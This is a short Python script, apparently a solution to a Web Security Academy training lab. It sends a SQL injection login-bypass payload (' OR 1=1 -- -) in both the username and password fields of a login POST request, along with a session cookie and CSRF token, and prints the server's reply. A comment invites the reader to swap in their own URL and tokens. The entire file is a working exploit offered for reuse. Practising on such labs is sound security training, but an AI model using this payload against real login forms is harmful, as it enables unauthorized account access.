import requests

# change your url, cookies and csrf token to work

url = "https://0a5b00bf041cb3a2c15a381b00770088.web-security-academy.net/"
cookies = {
	"session": "Gwjs8rm852P7OWciOzbFM2iPQF5yfcVJ"
}

data = {
	"csrf": "60IDTZaTyfWa6UgbmsAEBof2eLd1ThxA",
	"username": "' OR 1=1 -- -",
	"password": "' OR 1=1 -- -"
}

r = requests.post(url + "login", data=data, cookies=cookies)
print(r.status_code)
print(r.text)